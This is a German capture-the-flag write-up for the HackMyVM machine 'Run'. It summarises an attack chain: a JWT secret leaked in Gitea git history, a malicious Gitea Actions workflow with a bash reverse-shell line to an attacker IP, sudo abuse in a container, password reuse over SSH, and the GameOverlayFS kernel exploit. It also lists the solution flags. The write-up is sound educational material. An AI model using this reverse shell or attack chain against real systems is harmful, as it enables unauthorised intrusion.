# Run - HackMyVM (Medium)

![Run.png](Run.png)

## Übersicht

*   **VM:** Run
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Run)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 11. März 2024
*   **Original-Writeup:** https://alientec1908.github.io/Run_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Run" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer Gitea-Instanz (Version 1.21.7) auf Port 3000. Durch das Klonen eines öffentlichen Gitea-Repositories (`dev/flask-jwt-auth`) und Analyse der Git-Historie wurde ein zuvor verwendeter JWT Secret Key (`developer88`) aufgedeckt. Dieses Secret ermöglichte die Erstellung eines gültigen JWTs für den Benutzer `dev` oder die direkte Anmeldung mit `dev:developer88`. Mit diesem Zugriff wurden Gitea Actions genutzt, um eine Reverse Shell als Benutzer `act` (Gitea-Runner-Benutzer, lief vermutlich in einem Docker-Container) zu erhalten. Innerhalb des Containers hatte `act` volle `sudo`-Rechte, was zu Root-Rechten im Container führte. Von dort aus wurde eine SSH-Verbindung zum Host-System als Benutzer `dev` (mit dem Passwort `developer88`) hergestellt. Auf dem Host wurde festgestellt, dass der Kernel (Ubuntu 6.2.0-20-generic) anfällig für die "GameOverlayFS"-Schwachstelle (CVE-2023-2640 / CVE-2023-32629) war. Ein öffentlicher Exploit wurde heruntergeladen und ausgeführt, um Root-Rechte auf dem Host-System zu erlangen.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan` (impliziert, netdiscover wurde verwendet)
*   `netdiscover`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `curl`
*   `vi` / `nano`
*   Base64 Decoder (impliziert)
*   `git`
*   `pip`
*   Python3
*   `jwt.io` (impliziert für JWT-Analyse)
*   `john` (für JWT Secret Crack)
*   `nc` (netcat)
*   `script` (für Shell-Stabilisierung)
*   `stty`
*   `export`
*   `ssh`
*   `sudo`
*   `runc` (impliziert für Container-Exploit, aber nicht direkt genutzt)
*   `unshare` (im Kernel-Exploit-Skript)
*   `setcap` (im Kernel-Exploit-Skript)
*   `mount` (im Kernel-Exploit-Skript)
*   Standard Linux-Befehle (`ls`, `cat`, `id`, `pwd`, `cd`, `chmod`, `uname`, `rm`, `cp`, `mkdir`, `whoami`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Run" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration (Gitea):**
    *   IP-Adresse des Ziels (192.168.2.111) mit `netdiscover` identifiziert. Hostname `run.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte nur Port 3000 (HTTP), der von Gitea httpd 1.21.7 bedient wurde. Nikto und Nmap lieferten Details zur Gitea-Instanz.
    *   `gobuster` fand Gitea-Pfade wie `/admin`, `/issues` (Login erforderlich) und die Benutzerprofile `/dev` und `/administrator`.
    *   Im `/dev`-Profil wurde das öffentliche Repository `flask-jwt-auth` gefunden.

2.  **Vulnerability Analysis (JWT Secret Leak) & Initial Access (Gitea Actions RCE als `act`):**
    *   Das Repository `flask-jwt-auth` wurde mit `git clone http://run.hmv:3000/dev/flask-jwt-auth.git` heruntergeladen.
    *   Die Analyse der Git-Historie (`git show`) enthüllte einen früheren Commit, in dem ein JWT (`eyJ...`) und der zugehörige `SECRET_KEY` (`developer88`) vorhanden waren, bevor der Token durch "xxxxxxxx" ersetzt wurde.
    *   Der `SECRET_KEY` (`developer88`) wurde mit `john` aus dem JWT-Hash (HMAC-SHA256) geknackt.
    *   Mit den Credentials `dev:developer88` (oder einem selbst erstellten JWT mit dem Secret) wurde Zugriff auf Gitea erlangt.
    *   Ein neues Repository (`revshell`) wurde erstellt und Gitea Actions dafür aktiviert.
    *   Ein Workflow (`.gitea/workflows/shell.yaml`) wurde erstellt, der eine Bash-Reverse-Shell (`/bin/bash -i >& /dev/tcp/ANGRIFFS_IP/4242 0>&1`) bei einem `push`-Ereignis ausführt.
    *   Der Workflow wurde committet und zum Gitea-Repository gepusht (`git push origin main`).
    *   Eine Reverse Shell als Benutzer `act` (Gitea-Runner, vermutlich in einem Docker-Container) wurde auf einem Netcat-Listener (Port 4242) empfangen und stabilisiert.

3.  **Privilege Escalation (Container: `act` zu `root` via `sudo`):**
    *   Als `act` zeigte `id` die Mitgliedschaft in der `sudo`-Gruppe.
    *   `sudo -l` bestätigte, dass `act` volle `sudo`-Rechte (`(ALL : ALL) ALL`, `NOPASSWD: ALL`) im Container hatte.
    *   Mit `sudo su` wurden Root-Rechte innerhalb des Containers erlangt.

4.  **Privilege Escalation (Host: Container-Root zu Host-`dev` zu Host-`root` via Kernel Exploit):**
    *   Vom Root-Account im Container wurde eine SSH-Verbindung zum Docker-Host-Gateway (vermutlich `172.18.0.1`) als Benutzer `dev` mit dem Passwort `developer88` hergestellt.
    *   Auf dem Host (`dev@run`) wurde die Kernel-Version `6.2.0-20-generic` (Ubuntu) identifiziert.
    *   Diese Version ist anfällig für die "GameOverlayFS"-Schwachstelle (CVE-2023-2640 / CVE-2023-32629).
    *   Ein öffentlicher Exploit (`exploit.sh` von GitHub/g1vi) wurde nach `/tmp/ex.sh` auf den Host heruntergeladen und ausführbar gemacht. GCC war nicht installiert, daher wurde ein Skript-basierter Exploit gewählt.
    *   Durch Ausführen von `./ex.sh` wurde die Kernel-Schwachstelle ausgenutzt und eine Root-Shell auf dem Host-System erlangt.
    *   Die User-Flag (`56f98bdfaf5186243bc4cb99f0674f58`) wurde in `/home/dev/user.txt` gefunden.
    *   Die Root-Flag (`008b138f906537f51a5a5c2c69c4b8a2`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Exponierte Gitea-Instanz:** Ein Git-Server war öffentlich zugänglich.
*   **JWT Secret Leak in Git-Historie:** Ein JWT Secret Key (`developer88`) wurde in einem früheren Commit im Quellcode belassen, was das Erstellen gültiger JWTs oder das Erraten des zugehörigen Passworts ermöglichte.
*   **Gitea Actions RCE:** Missbrauch von Gitea Actions durch Erstellen eines bösartigen Workflows, der eine Reverse Shell ausführt.
*   **Übermäßige `sudo`-Rechte im Container:** Der Gitea-Runner-Benutzer (`act`) hatte volle `sudo`-Rechte innerhalb seines Containers.
*   **Kernel Exploit (GameOverlayFS / CVE-2023-2640 / CVE-2023-32629):** Eine bekannte Schwachstelle im Ubuntu-Kernel ermöglichte lokale Privilegieneskalation zu Root auf dem Host-System.
*   **Passwort-Wiederverwendung / Schwache Credentials:** Das Passwort `developer88` (identisch zum JWT Secret) ermöglichte den SSH-Zugriff auf den Host als `dev`.

## Flags

*   **User Flag (`/home/dev/user.txt`):** `56f98bdfaf5186243bc4cb99f0674f58`
*   **Root Flag (`/root/root.txt`):** `008b138f906537f51a5a5c2c69c4b8a2`

## Tags

`HackMyVM`, `Run`, `Medium`, `Gitea`, `JWT Exploit`, `Git History Leak`, `Gitea Actions RCE`, `Docker Escape` (impliziert durch Container-Root zu Host), `sudo Exploit`, `Kernel Exploit`, `CVE-2023-2640`, `CVE-2023-32629`, `GameOverlayFS`, `Linux`, `Web`, `Privilege Escalation`, `OpenSSH`
